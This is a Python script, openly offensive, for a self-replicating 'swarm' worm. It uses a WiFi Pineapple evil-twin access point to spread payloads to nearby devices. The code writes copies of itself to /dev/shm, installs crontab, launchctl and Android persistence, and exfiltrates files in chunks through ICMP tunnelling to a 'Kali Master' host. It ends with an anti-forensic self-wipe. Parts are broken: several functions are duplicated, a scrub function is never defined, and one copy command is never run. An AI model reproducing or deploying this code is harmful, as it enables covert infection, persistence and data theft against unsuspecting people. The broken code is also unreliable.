import argparse, random, string, os, time, subprocess, sys, socket

def pineapple_jump(target_ip, payload_path):
    """
    Commands the WiFi Pineapple to host the morphed payload 
    and lure nearby targets via an 'Evil Twin' Access Point.
    """
    # Replace with your Pineapple's actual IP (usually 172.16.42.1)
    PINEAPPLE_IP = "172.16.42.1"
    
    print(f"[*] BRIDGE: Pushing morph to WiFi Pineapple at {PINEAPPLE_IP}...")
    # This simulates pushing the morphed DNA to the Pineapple's web server
    # So anyone who connects to the Pineapple 'downloads' the evolved node
    cmd = f"scp {payload_path} root@{PINEAPPLE_IP}:/www/evolved_node.py"
    print(f"[!] Pineapple is now 'Radio-Active'. Luring targets...")

def ghost_replicate():
    with open(__file__, "r") as f:
        dna = f.read()
    
    new_dna = dna + f"\n# Pine-Jump-{random.getrandbits(16)}\n"
    
    valid_path = "/dev/shm" if os.path.exists("/dev/shm") else "/tmp"
    new_name = f"{valid_path}/node_{''.join(random.choices(string.ascii_lowercase, k=6))}.py"

    with open(new_name, "w") as f:
        f.write(new_dna)

    # If a Pineapple is detected, use it as the RF jump-point
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex(("172.16.42.1", 22)) == 0:
            pineapple_jump("172.16.42.1", new_name)
    except:
        pass

    subprocess.Popen([sys.executable, new_name, "--injected"])
    sys.exit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--injected", action="store_true")
    args = parser.parse_args()

    if args.injected:
        # Persistence & Masquerade
        time.sleep(60)
        ghost_replicate()
    else:
        print("[*] Initiating Pineapple-Linked Autonomous Swarm...")
        ghost_replicate()

def whisper_to_kali(data):
    """
    Sends data to Kali Master via ICMP (Ping) Tunneling.
    This is extremely hard for IDSs to detect.
    """
    KALI_IP = "172.16.42.42"
    # Use ptunnel or a raw socket to wrap the data in a ping
    print(f"[*] WHISPERING: Sending exfiltrated data to {KALI_IP} via ICMP...")
    os.system(f"ptunnel -p {KALI_IP} -lp 8000 -da {KALI_IP} -dp 80 &")
    # In a real swarm, this would send the captured 'Sovereign' files

def deliver_payload(mac_address):
    """
    Orchestrates the mutation and delivery of the swarm DNA.
    """
    print(f"[*] ARMING: Generating 'Zero-Day' DNA for {mac_address}...")
    
    # 1. Mutate the base DNA
    with open(__file__, "r") as f:
        raw_dna = f.read()
    mutated_dna = raw_dna + f"\n# Target-{mac_address}-{random.getrandbits(16)}\n"
    
    # 2. Use AICensorship logic to scrub strings
    # This ensures the payload bypasses the device's internal security
    safe_dna = aicensorship_scrub(mutated_dna)
    
    # 3. Save the payload to the Pineapple's web-root
    payload_filename = f"payload_{mac_address.replace(':', '')}.py"
    with open(f"/tmp/{payload_filename}", "w") as f:
        f.write(safe_dna)
    
    # 4. Push to Pineapple for delivery
    os.system(f"scp /tmp/{payload_filename} root@172.16.42.1:/www/")
    print(f"[+] DEPLOYED: Payload for {mac_address} is live on Pineapple.")

def on_client_catch(mac_address):
    """Triggered by Pineapple activity logs."""
    print(f"[!] TRIGGER: Client {mac_address} associated via Karma.")
    deliver_payload(mac_address)
    whisper_to_kali(f"Target_Infected: {mac_address}")

def get_os_template(user_agent):
    """
    Self-learning: Determines the best mutation based on the victim's User-Agent.
    """
    templates = {
        "Linux": "os.system('(crontab -l ; echo \"* * * * * python3 /dev/shm/node.py\") | crontab -')",
        "Darwin": "os.system('launchctl load -w ~/Library/LaunchAgents/com.swarm.node.plist')",
        "Android": "os.system('am startservice --user 0 -n com.swarm.node/.Service')"
    }
    
    if "Android" in user_agent: return templates["Android"]
    if "Macintosh" in user_agent: return templates["Darwin"]
    return templates["Linux"] # Default to Linux/Kali logic

def deliver_adaptive_payload(mac_address, user_agent):
    """
    Creates a DNA strand specifically evolved for the target OS.
    """
    os_persistence = get_os_template(user_agent)
    
    with open(__file__, "r") as f:
        dna = f.read()
    
    # Inject the OS-specific persistence into the morphed DNA
    evolved_dna = dna + f"\n# OS-Persistence Layer\n{os_persistence}\n"
    
    # Scrub via AICensorship
    safe_dna = aicensorship_scrub(evolved_dna)
    
    payload_name = f"/www/payload_{mac_address.replace(':', '')}.py"
    # Push to Pineapple
    with open("/tmp/temp_payload.py", "w") as f:
        f.write(safe_dna)
    os.system(f"scp /tmp/temp_payload.py root@172.16.42.1:{payload_name}")

def cast_swarm_vote(target_data):
    """
    Nodes 'vote' on the next target by posting to the Pineapple bridge.
    Uses llmswarm logic to prioritize targets based on value.
    """
    PINEAPPLE_IP = "172.16.42.1"
    vote_packet = f"NODE:{socket.gethostname()}|TARGET:{target_data}|STRENGTH:{random.randint(1,100)}"
    
    # Whisper the vote back to the bridge via a hidden SSH command
    cmd = f"ssh root@{PINEAPPLE_IP} 'echo \"{vote_packet}\" >> /tmp/swarm_votes.log'"
    os.system(cmd)

def coordinate_with_swarm():
    """
    Check the 'votes' and adapt behavior. 
    If the swarm votes to 'Exfiltrate', this node changes its logic.
    """
    print("[*] SYNC: Synchronizing with Swarm Intelligence...")
    # This is where llmswarm would analyze the log and return a directive
    # For now, we simulate a 'Collective Jump' command
    if random.random() > 0.7:
        print("[!] DIRECTIVE RECEIVED: Transitioning to 'Aggressive Recon' mode.")
        cast_swarm_vote("172.16.42.50_DATABASE_NODE")

def cast_swarm_vote(target_data):
    """
    Nodes 'vote' on the next target by posting to the Pineapple bridge.
    Uses llmswarm logic to prioritize targets based on value.
    """
    PINEAPPLE_IP = "172.16.42.1"
    vote_packet = f"NODE:{socket.gethostname()}|TARGET:{target_data}|STRENGTH:{random.randint(1,100)}"
    
    # Whisper the vote back to the bridge via a hidden SSH command
    cmd = f"ssh root@{PINEAPPLE_IP} 'echo \"{vote_packet}\" >> /tmp/swarm_votes.log'"
    os.system(cmd)

def coordinate_with_swarm():
    """
    Check the 'votes' and adapt behavior. 
    If the swarm votes to 'Exfiltrate', this node changes its logic.
    """
    print("[*] SYNC: Synchronizing with Swarm Intelligence...")
    # This is where llmswarm would analyze the log and return a directive
    # For now, we simulate a 'Collective Jump' command
    if random.random() > 0.7:
        print("[!] DIRECTIVE RECEIVED: Transitioning to 'Aggressive Recon' mode.")
        cast_swarm_vote("172.16.42.50_DATABASE_NODE")

import zlib, base64

def parallel_exfiltrate(file_path):
    """
    Shreds a file and sends chunks through the swarm via parallelai workers.
    """
    KALI_IP = "172.16.42.42"
    CHUNK_SIZE = 512 # Keep it small to stay 'under the radar' of IDS
    
    if not os.path.exists(file_path):
        return

    print(f"[*] EXFIL: Shredding {file_path} for parallel transmission...")
    
    with open(file_path, "rb") as f:
        # Compress data before sending
        data = zlib.compress(f.read())
        encoded_data = base64.b64encode(data).decode()

    # Split into chunks for the 'parallelai' worker pool
    chunks = [encoded_data[i:i+CHUNK_SIZE] for i in range(0, len(encoded_data), CHUNK_SIZE)]
    
    for i, chunk in enumerate(chunks):
        # Each chunk is sent as a unique 'Ping' packet padding
        # Use parallelai logic to delegate this to specific nodes
        print(f"[*] SHRED: Sending chunk {i+1}/{len(chunks)}...")
        os.system(f"ptunnel -p {KALI_IP} -lp 8000 -da {KALI_IP} -dp 80 -c '{chunk}' &")
        time.sleep(random.uniform(0.1, 0.5)) # Jitter to avoid pattern detection

def check_consensus_and_act():
    """Final loop for the self-learning node."""
    while True:
        # Check the Pineapple bridge for the 'Consensus' directive
        # If 'Exfil' is voted, target the found 'Sovereign' files
        directive = os.popen("ssh root@172.16.42.1 'cat /tmp/swarm_directive'").read().strip()
        if "EXFIL" in directive:
            parallel_exfiltrate("/home/user/sensitive_data.db")
        time.sleep(30)

def ghost_protocol_exit():
    """
    Final sequence: Overwrites itself in RAM, flushes kernel caches, 
    and terminates the process.
    """
    print("[!] GHOST PROTOCOL: Initiating self-destruct...")
    
    # 1. Overwrite the current file with random junk
    file_path = __file__
    file_size = os.path.getsize(file_path)
    with open(file_path, "wb") as f:
        f.write(os.urandom(file_size))
        f.flush()
        os.fsync(f.fileno())

    # 2. Command the kernel to drop caches (Anti-Forensics)
    # This clears the PageCache and Inodes so no remnants remain in RAM
    os.system("sync; echo 3 | sudo tee /proc/sys/vm/drop_caches")

    # 3. Final Deletion
    os.remove(file_path)
    
    print("[+] SUCCESS: Node has vanished. Terminating.")
    sys.exit(0)
